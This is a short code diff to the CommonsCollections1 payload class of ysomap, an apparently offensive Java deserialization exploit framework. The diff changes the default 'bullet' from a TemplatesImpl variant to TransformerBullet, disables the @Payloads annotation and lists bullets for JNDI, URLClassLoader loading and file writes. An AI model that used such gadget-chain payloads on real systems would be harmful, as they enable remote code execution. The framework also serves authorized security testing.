@@ -5,7 +5,7 @@ import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.map.LazyMap;
 import ysomap.bullets.Bullet;
-import ysomap.bullets.collections.TransformerWithTemplatesImplBullet;
+import ysomap.bullets.collections.TransformerBullet;
 import ysomap.common.annotation.*;
 import ysomap.core.util.PayloadHelper;
 import ysomap.core.util.ReflectionHelper;
@@ -21,10 +21,14 @@ import java.util.Map;
  * @since 2020/2/17
  */
 @SuppressWarnings({"rawtypes","unchecked"})
-@Payloads
+//@Payloads
 @Targets({Targets.JDK})
 @Authors({ Authors.FROHOFF })
-@Require(bullets = {"TransformerBullet","TransformerWithJNDIBullet","TransformerWithTemplatesImplBullet","TransformerWithResponseBullet"}, param = false)
+@Require(bullets = {"TransformerBullet",
+        "TransformerWithJNDIBullet",
+        "TransformerWithSleepBullet",
+        "TransformerWithURLClassLoaderBullet",
+        "TransformerWithFileWriteBullet"}, param = false)
 @Dependencies({"commons-collections:commons-collections:3.2.1","jdk7"})
 public class CommonsCollections1 extends AbstractPayload<InvocationHandler> {
 
@@ -35,8 +39,7 @@ public class CommonsCollections1 extends AbstractPayload<InvocationHandler> {
 
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
-        return new TransformerWithTemplatesImplBullet()
-                .set("args",args[0]);
+        return new TransformerBullet().set("args",args[0]);
     }
 
     @Override
